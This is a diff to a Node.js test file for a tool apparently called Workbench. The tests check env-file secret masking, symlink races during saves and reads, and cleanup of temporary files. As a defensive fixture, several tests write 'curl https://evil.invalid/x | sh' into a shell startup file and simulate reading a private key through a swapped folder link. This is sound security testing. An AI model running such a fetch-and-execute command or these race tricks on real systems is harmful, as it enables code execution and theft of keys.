@@ -5,12 +5,12 @@ import crypto from 'node:crypto';
 import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
-import { listFiles, readFile, writeFile, changedLines, checkPath, MAX_FILE_BYTES } from '../src/core/files.mjs';
+import { listFiles, readFile, writeFile, changedLines, checkPath, isSaveFile, MAX_FILE_BYTES } from '../src/core/files.mjs';
 
 // Keep the person's own git settings, name and email out of these repositories, and their home folder out of these
 // tests.
 const ENV_KEYS = ['GIT_CONFIG_GLOBAL', 'GIT_CONFIG_NOSYSTEM', 'GIT_AUTHOR_NAME', 'GIT_AUTHOR_EMAIL', 'GIT_COMMITTER_NAME',
-  'GIT_COMMITTER_EMAIL', 'GIT_CEILING_DIRECTORIES', 'HOME', 'XDG_CONFIG_HOME'];
+  'GIT_COMMITTER_EMAIL', 'GIT_CEILING_DIRECTORIES', 'HOME', 'XDG_CONFIG_HOME', 'PATH'];
 const savedEnv = Object.fromEntries(ENV_KEYS.map(k => [k, process.env[k]]));
 
 let T, outside;
@@ -20,6 +20,34 @@ const git = (cwd, ...args) => execFileSync('git', args, { cwd, encoding: 'utf8',
 const sha = bytes => crypto.createHash('sha256').update(bytes).digest('hex');
 const bytesOf = (root, rel) => fs.readFileSync(path.join(root, rel));
 const leftovers = dir => fs.readdirSync(dir).filter(n => n.includes('.workbench-save-'));
+
+/** fs's and process's own functions, for the tests' own steps while some of them are mocked. */
+const REAL = {
+  renameSync: fs.renameSync, symlinkSync: fs.symlinkSync, unlinkSync: fs.unlinkSync, lstatSync: fs.lstatSync,
+  openSync: fs.openSync, fsyncSync: fs.fsyncSync, chdir: process.chdir.bind(process),
+};
+
+/**
+ * Swaps the folder `rel` of `root` for a link to `elsewhere` (the folder itself goes to `<rel>.real`), and back, as an
+ * agent racing a save could. Uses fs's own functions, never the mocked ones.
+ */
+function swapper(root, rel, elsewhere) {
+  const at = path.join(root, rel);
+  let swapped = false;
+  return {
+    toLink() {
+      REAL.renameSync(at, `${at}.real`);
+      REAL.symlinkSync(elsewhere, at);
+      swapped = true;
+    },
+    back() {
+      if (!swapped) return;
+      REAL.unlinkSync(at);
+      REAL.renameSync(`${at}.real`, at);
+      swapped = false;
+    },
+  };
+}
 
 /** A new repository holding `files` ({ path: text or bytes }) in its first commit: { root, since }. */
 function repo(files = {}) {
@@ -295,8 +323,12 @@ test('env files show each value only as its last four characters, and are never 
     '   ',
   ].join('\n') + '\n';
   const crlf = text.replace(/\n/g, '\r\n');
-  const { root } = repo({ '.env': text, 'config/.env.local': crlf, 'prod.env': text, 'LOUD.ENV': text, 'env.ts': 'export const env = 1;\n' });
-  for (const rel of ['.env', 'config/.env.local', 'prod.env', 'LOUD.ENV']) {
+  const { root } = repo({
+    '.env': text, 'config/.env.local': crlf, 'prod.env': text, 'LOUD.ENV': text, '.envrc': text, 'tools/.EnvRC': text,
+    'env.ts': 'export const env = 1;\n', '.envrc.md': 'notes\n',
+  });
+  // direnv's .envrc holds keys as `export NAME=value`, as env files do.
+  for (const rel of ['.env', 'config/.env.local', 'prod.env', 'LOUD.ENV', '.envrc', 'tools/.EnvRC']) {
     const got = await readFile({ root, rel });
     assert.equal(got.kind, 'secret', rel);
     assert.equal(got.text, masked, rel);
@@ -307,6 +339,7 @@ test('env files show each value only as its last four characters, and are never 
   }
   assert.equal((await readFile({ root, rel: 'config/.env.local' })).eol, 'crlf');
   assert.equal((await readFile({ root, rel: 'env.ts' })).kind, 'text');
+  assert.equal((await readFile({ root, rel: '.envrc.md' })).kind, 'text');
   assert.equal(fs.readFileSync(path.join(root, '.env'), 'utf8'), text);
   // A value whose closing quote never comes: every line after it is masked.
   const { root: r2 } = repo({ '.env': `KEY="${stripe}\nA=1\n${old}\n` });
@@ -375,6 +408,37 @@ test('in an env file, a key never passes for the name of a value', async () => {
     assert.equal(got.text.includes(secret), false);
     assert.equal(got.text.includes(secret.slice(-4)), false, 'not even its last four characters');
   }
+});
+
+test('in an env file, a comment after a value is not part of it: the last four characters are the value’s', async () => {
+  const key = fakeKey('sk_' + 'live_');
+  const end = key.slice(-4);
+  const text = [
+    `API_KEY=${key} # rotated 2026`,
+    `TOKEN=${key} #prod`,
+    `INLINE=${key}\t# the prod key`,
+    'EMPTY= # fill in later',
+    `QUOTED="${key}" # rotated 2026`,
+    `# OLD_KEY=${key} # the one before`,
+    `HASHED=${key}#part-of-it`, // a "#" with no space before it is part of the value, as sh reads it
+    'SHORT=#x',
+    'export PORT=3000 # the default',
+  ].join('\n') + '\n';
+  const { root } = repo({ '.env': text });
+  const got = await readFile({ root, rel: '.env' });
+  assert.equal(got.text, [
+    `API_KEY=•••• ${end} ••••`,
+    `TOKEN=•••• ${end} ••••`,
+    `INLINE=•••• ${end} ••••`,
+    'EMPTY= ••••',
+    `QUOTED="•••• ${end}" ••••`,
+    `# OLD_KEY=•••• ${end} ••••`,
+    'HASHED=•••• f-it',
+    'SHORT=••••',
+    'export PORT=•••• ••••',
+  ].join('\n') + '\n');
+  const comments = got.text.split(end).join(''); // the key's own last characters may be digits too
+  for (const words of ['2026', 'prod', 'later', 'before', 'default']) assert.equal(comments.includes(words), false, words);
 });
 
 // ------------------------------------------------------------------ saving
@@ -515,7 +579,7 @@ test('when a save fails, its temporary file beside the original is removed', asy
 });
 
 test('just before the rename, the file must still be a regular file holding what was edited', async (t) => {
-  const { root } = repo({ 'a.txt': 'one\n', 'b.txt': 'one\n' });
+  const { root } = repo({ 'a.txt': 'one\n', 'b.txt': 'one\n', 'c.txt': 'one\n' });
   const realFsync = fs.fsyncSync;
   const fsync = t.mock.method(fs, 'fsyncSync');
   // An agent writes the file while the person's text is being saved: its write is kept.
@@ -523,9 +587,22 @@ test('just before the rename, the file must still be a regular file holding what
     realFsync(fd);
     fs.writeFileSync(path.join(root, 'a.txt'), 'the agent\n');
   });
-  await assert.rejects(writeFile({ root, rel: 'a.txt', text: 'the person\n', hash: sha('one\n') }),
-    e => e.plain === true && e.why === 'changed' && e.hash === sha('the agent\n'));
+  await assert.rejects(writeFile({ root, rel: 'a.txt', text: 'the person\n', hash: sha('one\n') }), e => {
+    assert.equal(e.message, 'a.txt changed on disk since it was opened, so nothing was written.');
+    return e.plain === true && e.why === 'changed' && e.hash === sha('the agent\n');
+  });
   assert.equal(fs.readFileSync(path.join(root, 'a.txt'), 'utf8'), 'the agent\n');
+  assert.deepEqual(leftovers(root), []);
+  // The same during a save the person makes anyway (force): it changed again, and says so.
+  fsync.mock.mockImplementationOnce((fd) => {
+    realFsync(fd);
+    fs.writeFileSync(path.join(root, 'c.txt'), 'the agent again\n');
+  });
+  await assert.rejects(writeFile({ root, rel: 'c.txt', text: 'the person\n', hash: sha('one\n'), force: true }), e => {
+    assert.equal(e.message, 'c.txt changed again, so nothing was written.');
+    return e.plain === true && e.why === 'changed' && e.hash === sha('the agent again\n');
+  });
+  assert.equal(fs.readFileSync(path.join(root, 'c.txt'), 'utf8'), 'the agent again\n');
   assert.deepEqual(leftovers(root), []);
   // An agent puts a link in its place: nothing is written through it.
   fsync.mock.mockImplementationOnce((fd) => {
@@ -554,6 +631,188 @@ test('a folder swapped for a link to somewhere else while a save runs: nothing i
   assert.equal(fs.readFileSync(path.join(elsewhere, 'x.txt'), 'utf8'), 'one\n');
   assert.deepEqual(fs.readdirSync(elsewhere), ['x.txt']);
   assert.equal(fs.readFileSync(path.join(root, 'src.moved', 'x.txt'), 'utf8'), 'one\n');
+  assert.deepEqual(leftovers(path.join(root, 'src.moved')), []);
+});
+
+test('a save stands in the file’s folder: a folder swapped for a link at any step sends nothing elsewhere', async (t) => {
+  const cwd = process.cwd();
+  // Somewhere the person can write, with a file of the same name: their own shell setup, or the repository's config.
+  const home = path.join(T, `home-${++made}`);
+  fs.mkdirSync(home);
+  fs.writeFileSync(path.join(home, '.zshrc'), 'echo the person’s own shell setup\n');
+  const { root } = repo({ 'src/.zshrc': 'echo project\n', 'lib/config': 'project config\n' });
+  const gitConfig = fs.readFileSync(path.join(root, '.git', 'config'));
+  const cases = [
+    { folder: 'src', name: '.zshrc', elsewhere: home, theirs: 'echo the person’s own shell setup\n', mine: 'echo project\n' },
+    { folder: 'lib', name: 'config', elsewhere: path.join(root, '.git'), theirs: gitConfig, mine: 'project config\n' },
+  ];
+  const fired = { open: 0, fsync: 0, rename: 0, chdir: 0 };
+  let swap = null;
+  t.mock.method(fs, 'openSync', function (p, flags, ...rest) {
+    if (swap && flags === 'wx' && String(p).includes('.workbench-save-')) {
+      fired.open++;
+      swap.toLink(); // before the temporary file is made
+    }
+    return REAL.openSync(p, flags, ...rest);
+  });
+  t.mock.method(fs, 'fsyncSync', function (fd) {
+    REAL.fsyncSync(fd);
+    if (swap && fired.open > fired.fsync) {
+      fired.fsync++;
+      swap.back(); // back before the last look
+    }
+  });
+  t.mock.method(fs, 'renameSync', function (from, to) {
+    if (swap && String(from).includes('.workbench-save-')) {
+      fired.rename++;
+      swap.toLink(); // and again before the rename
+    }
+    return REAL.renameSync(from, to);
+  });
+  for (const c of cases) {
+    const rel = `${c.folder}/${c.name}`;
+    const was = { ...fired };
+    swap = swapper(root, c.folder, c.elsewhere);
+    let saved;
+    try {
+      saved = await writeFile({ root, rel, text: 'curl https://evil.invalid/x | sh\n', hash: sha(c.mine) });
+    } finally {
+      swap.back();
+      swap = null;
+    }
+    assert.deepEqual([fired.open - was.open, fired.fsync - was.fsync, fired.rename - was.rename], [1, 1, 1], rel);
+    // What was elsewhere is untouched, and nothing of the save's is left there.
+    assert.deepEqual(fs.readFileSync(path.join(c.elsewhere, c.name)), Buffer.from(c.theirs), rel);
+    assert.deepEqual(leftovers(c.elsewhere), [], rel);
+    // The save went where Workbench stood: the folder the person opened, wherever it was at that moment.
+    assert.deepEqual(saved, { hash: sha('curl https://evil.invalid/x | sh\n'), size: 33 });
+    assert.equal(fs.readFileSync(path.join(root, rel), 'utf8'), 'curl https://evil.invalid/x | sh\n', rel);
+    assert.deepEqual(leftovers(path.join(root, c.folder)), [], rel);
+    assert.equal(process.cwd(), cwd, 'Workbench is back where it was');
+  }
+  assert.deepEqual(fs.readFileSync(path.join(root, '.git', 'config')), gitConfig);
+
+  // Swapped between the check of the path and the step into the folder: Workbench lands elsewhere, sees it, and stops.
+  put(root, { 'src/.zshrc': 'echo project\n' });
+  const realSrc = fs.realpathSync.native(path.join(root, 'src'));
+  t.mock.method(process, 'chdir', function (dir) {
+    if (swap && dir === realSrc) {
+      fired.chdir++;
+      const once = swap;
+      swap = null;
+      once.toLink();
+    }
+    return REAL.chdir(dir);
+  });
+  const s = swapper(root, 'src', home);
+  swap = s;
+  try {
+    await refused(writeFile({ root, rel: 'src/.zshrc', text: 'curl https://evil.invalid/x | sh\n', hash: sha('echo project\n') }),
+      /^The folder that holds src\/\.zshrc moved while Workbench saved it, so nothing was written\.$/);
+  } finally {
+    s.back();
+    swap = null;
+  }
+  assert.equal(fired.chdir, 1);
+  assert.equal(fs.readFileSync(path.join(home, '.zshrc'), 'utf8'), 'echo the person’s own shell setup\n');
+  assert.equal(fs.readFileSync(path.join(root, 'src', '.zshrc'), 'utf8'), 'echo project\n');
+  assert.deepEqual([...leftovers(home), ...leftovers(path.join(root, 'src'))], []);
+  assert.equal(process.cwd(), cwd, 'Workbench is back where it was after a refusal too');
+});
+
+test('reading stands in the file’s folder too: a folder swapped for a link never shows what is elsewhere', async (t) => {
+  const cwd = process.cwd();
+  const keys = path.join(T, `keys-${++made}`);
+  fs.mkdirSync(keys);
+  fs.writeFileSync(path.join(keys, 'id_ed25519'), 'OUTSIDE PRIVATE KEY\n');
+  const { root } = repo({ 'src/id_ed25519': 'not a key, a test fixture\n', 'lib/config': 'project config\n' });
+  let swap = null; // the swap still to make, once
+  const fire = () => {
+    const s = swap;
+    swap = null;
+    s.toLink();
+  };
+  let looked = 0;
+  // Swapped once Workbench has checked the path, as it looks at the file.
+  t.mock.method(fs, 'lstatSync', function (p, ...rest) {
+    if (swap && /(?:^|\/)(?:id_ed25519|config)$/.test(String(p))) {
+      looked++;
+      fire();
+    }
+    return REAL.lstatSync(p, ...rest);
+  });
+  const cases = [['src', 'id_ed25519', keys, 'not a key, a test fixture\n'], ['lib', 'config', path.join(root, '.git'), 'project config\n']];
+  for (const [folder, name, elsewhere, mine] of cases) {
+    const s = swapper(root, folder, elsewhere);
+    swap = s;
+    let got;
+    try {
+      got = await readFile({ root, rel: `${folder}/${name}` });
+    } finally {
+      s.back();
+      swap = null;
+    }
+    assert.equal(got.kind, 'text');
+    assert.equal(got.text, mine);
+    assert.equal(process.cwd(), cwd);
+  }
+  assert.equal(looked, 2);
+
+  // Swapped between the check of the path and the step into the folder: refused, and nothing is read.
+  const realSrc = fs.realpathSync.native(path.join(root, 'src'));
+  let stepped = 0;
+  t.mock.method(process, 'chdir', function (dir) {
+    if (swap && dir === realSrc) {
+      stepped++;
+      fire();
+    }
+    return REAL.chdir(dir);
+  });
+  const s = swapper(root, 'src', keys);
+  swap = s;
+  try {
+    await refused(readFile({ root, rel: 'src/id_ed25519' }), /^The folder that holds src\/id_ed25519 moved while Workbench read it\.$/);
+  } finally {
+    s.back();
+    swap = null;
+  }
+  assert.equal(stepped, 1);
+  assert.equal(process.cwd(), cwd);
+});
+
+test('changedLines counts the lines of the file it read itself, standing in its folder, never of a second look', async (t) => {
+  const { root, since } = repo({ 'a.txt': 'a\n' });
+  put(root, { 'src/u.txt': '1\n2\n' }); // never added: new altogether
+  const far = path.join(T, `far-${++made}`);
+  fs.mkdirSync(far);
+  fs.writeFileSync(path.join(far, 'u.txt'), Array.from({ length: 50 }, (_, i) => `${i + 1}\n`).join(''));
+  const s = swapper(root, 'src', far);
+  let looks = 0;
+  t.mock.method(fs, 'lstatSync', function (p, ...rest) {
+    if (/(?:^|\/)u\.txt$/.test(String(p)) && ++looks === 2) s.toLink(); // a second look at the file finds the link
+    return REAL.lstatSync(p, ...rest);
+  });
+  let got;
+  try {
+    got = await changedLines({ root, since, rel: 'src/u.txt' });
+  } finally {
+    s.back();
+  }
+  assert.ok(looks >= 1);
+  assert.deepEqual(got, [1, 2]);
+});
+
+test('changedLines gives only lines of the file it read, though git reads the file again by its path', async (t) => {
+  const { root, since } = repo({ 'a.txt': '1\n2\n3\n' });
+  put(root, { 'a.txt': '1\nTWO\n3\n' });
+  // Once Workbench has read the file, an agent makes it longer (or swaps its folder for a link), before git looks.
+  const realClose = fs.closeSync;
+  t.mock.method(fs, 'closeSync').mock.mockImplementationOnce((fd) => {
+    realClose(fd);
+    fs.writeFileSync(path.join(root, 'a.txt'), '1\nTWO\n3\n4\n5\n');
+  });
+  assert.deepEqual(await changedLines({ root, since, rel: 'a.txt' }), [2]);
+  assert.match(git(root, 'diff', '-U0', since), /^@@ -3,0 \+4,2 @@$/m, 'git saw the longer file');
 });
 
 test('the temporary file is made only where nothing is, not even a link', async (t) => {
@@ -573,6 +832,38 @@ test('a long file name still gets a temporary name that fits', async () => {
   await writeFile({ root, rel: name, text: 'two\n', hash: sha('one\n') });
   assert.equal(fs.readFileSync(path.join(root, name), 'utf8'), 'two\n');
   assert.deepEqual(leftovers(root), []);
+});
+
+test('a save cut short leaves its sibling: the list leaves it out, and a later save in that folder removes it once it is old', async () => {
+  for (const yes of ['.a.txt.workbench-save-0123456789abcdef', 'src/.b.js.workbench-save-00112233445566ff', '.x.workbench-save-ffffffffffffffff']) {
+    assert.equal(isSaveFile(yes), true, yes);
+  }
+  for (const no of ['a.txt', 'a.txt.workbench-save-0123456789abcdef', '.a.txt.workbench-save-0123', '.a.txt.workbench-save-0123456789ABCDEF',
+    '.workbench-save-0123456789abcdef', '.a.workbench-save-0123456789abcdef/inner.txt', '.a.txt.workbench-save-0123456789abcdef.bak']) {
+    assert.equal(isSaveFile(no), false, no);
+  }
+  const { root } = repo({ 'a.txt': 'one\n', 'src/b.js': 'b\n' });
+  const hourAgo = new Date(Date.now() - 60 * 60_000);
+  const old = '.a.txt.workbench-save-0123456789abcdef'; // a save of a.txt, cut short an hour ago
+  const fresh = '.a.txt.workbench-save-fedcba9876543210'; // one that may still be under way
+  const oldLink = '.l.workbench-save-aaaaaaaaaaaaaaaa';
+  const oldFolder = '.d.workbench-save-bbbbbbbbbbbbbbbb';
+  const elsewhere = 'src/.b.js.workbench-save-00112233445566ff'; // in another folder
+  put(root, { [old]: 'half of the person’s te', [fresh]: 'the person’s text, being written', [elsewhere]: 'b, half' });
+  fs.symlinkSync(path.join(outside, 'private.txt'), path.join(root, oldLink));
+  fs.mkdirSync(path.join(root, oldFolder));
+  for (const rel of [old, oldFolder, elsewhere]) fs.utimesSync(path.join(root, rel), hourAgo, hourAgo);
+  fs.lutimesSync(path.join(root, oldLink), hourAgo, hourAgo);
+  assert.deepEqual((await listFiles({ root })).files, ['a.txt', 'src/b.js']);
+
+  await writeFile({ root, rel: 'a.txt', text: 'two\n', hash: sha('one\n') });
+  assert.equal(fs.readFileSync(path.join(root, 'a.txt'), 'utf8'), 'two\n');
+  assert.equal(fs.existsSync(path.join(root, old)), false, 'an old sibling is removed');
+  assert.equal(fs.readFileSync(path.join(root, fresh), 'utf8'), 'the person’s text, being written');
+  assert.equal(fs.lstatSync(path.join(root, oldLink)).isSymbolicLink(), true, 'only regular files are removed');
+  assert.equal(fs.lstatSync(path.join(root, oldFolder)).isDirectory(), true);
+  assert.equal(fs.readFileSync(path.join(root, elsewhere), 'utf8'), 'b, half', 'only in the folder of the file saved');
+  assert.equal(fs.readFileSync(path.join(outside, 'private.txt'), 'utf8'), 'outside the project\n');
 });
 
 // ------------------------------------------------------------------ the list
@@ -611,19 +902,54 @@ test('a file in a conflict is listed once', async () => {
   assert.deepEqual((await listFiles({ root })).files, ['c.txt']);
 });
 
+test('when git’s list of new files is more than Workbench reads at once, the list is cut, not refused', async (t) => {
+  const { root } = repo({ 'a.txt': 'a\n', 'src/b.js': 'b\n' });
+  // A stand-in for git that answers `ls-files --others` with more than 64 MB of names (an agent's copy with a
+  // node_modules no rule hides, say) and hands everything else to the real git.
+  const realGit = process.env.PATH.split(path.delimiter).map(d => path.join(d, 'git')).find(p => fs.existsSync(p));
+  const bin = path.join(T, `bin-${++made}`);
+  fs.mkdirSync(bin);
+  const names = path.join(bin, 'names');
+  const name = n => `new/${String(n).padStart(7, '0')}-${'n'.repeat(1388)}`; // 1400 bytes with its NUL
+  const count = 50_000; // 70 MB
+  fs.writeFileSync(names, Array.from({ length: count }, (_, n) => `${name(n)}\0`).join(''));
+  fs.writeFileSync(path.join(bin, 'git'), [
+    '#!/bin/sh',
+    'for a in "$@"; do',
+    `  if [ "$a" = "--others" ]; then exec cat '${names}'; fi`,
+    'done',
+    `exec '${realGit}' "$@"`,
+  ].join('\n') + '\n', { mode: 0o755 });
+  const PATH = process.env.PATH;
+  process.env.PATH = `${bin}${path.delimiter}${PATH}`;
+  t.after(() => { process.env.PATH = PATH; });
+
+  const all = await listFiles({ root });
+  assert.equal(all.truncated, true);
+  assert.deepEqual(all.files.slice(0, 2), ['a.txt', 'new/0000000-' + 'n'.repeat(1388)]);
+  assert.ok(all.files.includes('src/b.js'), 'every tracked file is there');
+  const fresh = all.files.filter(f => f.startsWith('new/'));
+  assert.ok(fresh.length > 1000 && fresh.length < count, `${fresh.length} new files`);
+  assert.ok(fresh.every((f, k) => f === name(k)), 'only names that came whole, in order');
+  assert.deepEqual(await listFiles({ root, max: 3 }), { files: ['a.txt', name(0), 'src/b.js'], truncated: true });
+});
+
 // ------------------------------------------------------------------ changed lines
 
 test('changedLines: the lines of the current file that the work since a commit added or changed', async () => {
+  // A NUL past git's first 8000 bytes: git diffs it as text, and the view calls it binary, so it has no lines.
+  const lateNul = Buffer.concat([Buffer.from(`${'a'.repeat(9000)}\nx\n`), Buffer.from([0]), Buffer.from('\ny\n')]);
   const { root, since } = repo({
     'a.txt': 'one\ntwo\nthree\n', 'same.txt': 'same\n', 'del.txt': '1\n2\n3\n', 'win.txt': 'a\r\nb\r\n',
     'logo.png': Buffer.from([0x89, 0x50, 0x00, 0x01]), '.gitignore': '*.log\n', 'src/b.js': 'let b = 1;\nexport default b;\n',
+    'late.txt': lateNul,
   });
   // A commit after `since`, then changes not committed: both count.
   put(root, { 'a.txt': 'ONE\ntwo\nthree\n' });
   git(root, 'commit', '-q', '-am', 'the agent, first');
   put(root, {
     'a.txt': 'ONE\ntwo\nTHREE\nfour\n', 'del.txt': '1\n3\n', 'win.txt': 'a\r\nB\r\n', 'logo.png': Buffer.from([0x89, 0x50, 0x00, 0x02]),
-    'src/b.js': 'let b = 2;\nexport default b;\n',
+    'src/b.js': 'let b = 2;\nexport default b;\n', 'late.txt': Buffer.concat([lateNul, Buffer.from('z\n')]),
   });
   put(root, { 'added.js': 'x\ny\n' });
   git(root, 'add', 'added.js');
@@ -635,6 +961,9 @@ test('changedLines: the lines of the current file that the work since a commit a
   assert.deepEqual(await lines('del.txt'), []); // only taken away: no line of the current file is new
   assert.deepEqual(await lines('win.txt'), [2]);
   assert.deepEqual(await lines('logo.png'), []);
+  assert.equal((await readFile({ root, rel: 'late.txt' })).kind, 'binary');
+  assert.match(git(root, 'diff', '-U0', since, '--', 'late.txt'), /^\+z$/m, 'git itself diffs it as text');
+  assert.deepEqual(await lines('late.txt'), []);
   assert.deepEqual(await lines('added.js'), [1, 2]);
   assert.deepEqual(await lines('fresh.js'), [1, 2, 3]); // never added: all of it is new, as the git screen says
   assert.deepEqual(await lines('empty-new.txt'), []);
@@ -660,4 +989,29 @@ test('changedLines in an agent’s worktree, against the commit it started from'
   assert.deepEqual(await changedLines({ root, since, rel: 'export.ts' }), []); // the person's folder is untouched
   assert.deepEqual((await listFiles({ root: ws })).files, ['export.ts', 'new.ts']);
   await refused(readFile({ root: ws, rel: '.git' }), /git’s own folder/); // a worktree's .git is a file
+});
+
+test('changedLines: a file the work took out of git but kept is compared with the commit it started from, as the git screen does', async () => {
+  const eight = Array.from({ length: 8 }, (_, i) => `line ${i + 1}`).join('\n') + '\n';
+  const { root, since } = repo({ 'untracked-again.js': eight, 'rm-then-rewrite.js': eight, 'was-a-folder/inner.txt': 'x\n', 'keep.js': 'k\n' });
+  const ws = path.join(T, `ws-${++made}`);
+  git(root, 'worktree', 'add', '-q', '-b', 'workbench/probe-2', ws, 'HEAD');
+  git(ws, 'rm', '-q', '--cached', 'untracked-again.js'); // still there, unchanged, and no rule hides it
+  git(ws, 'rm', '-q', 'rm-then-rewrite.js');
+  put(ws, { 'rm-then-rewrite.js': eight.replace('line 5', 'line FIVE') });
+  git(ws, 'rm', '-rq', 'was-a-folder');
+  put(ws, { 'was-a-folder': 'a\nb\nc\n' }); // a file where a folder was: new
+  assert.match(git(ws, 'status', '--porcelain'), /^\?\? untracked-again\.js$/m);
+  const lines = rel => changedLines({ root: ws, since, rel });
+  assert.deepEqual(await lines('untracked-again.js'), []);
+  assert.deepEqual(await lines('rm-then-rewrite.js'), [5]);
+  assert.deepEqual(await lines('was-a-folder'), [1, 2, 3]);
+  // The same once the removals are committed.
+  git(ws, 'commit', '-q', '-m', 'untracked');
+  assert.deepEqual(await lines('untracked-again.js'), []);
+  assert.deepEqual(await lines('rm-then-rewrite.js'), [5]);
+  // The scratch index it compared with is gone, and the agent's own index is as it was.
+  const tmp = path.join(process.env.HOME, '.workbench', 'tmp');
+  assert.deepEqual(fs.existsSync(tmp) ? fs.readdirSync(tmp).filter(n => n.startsWith('workbench-index-')) : [], []);
+  assert.equal(git(ws, 'ls-files'), 'keep.js');
 });
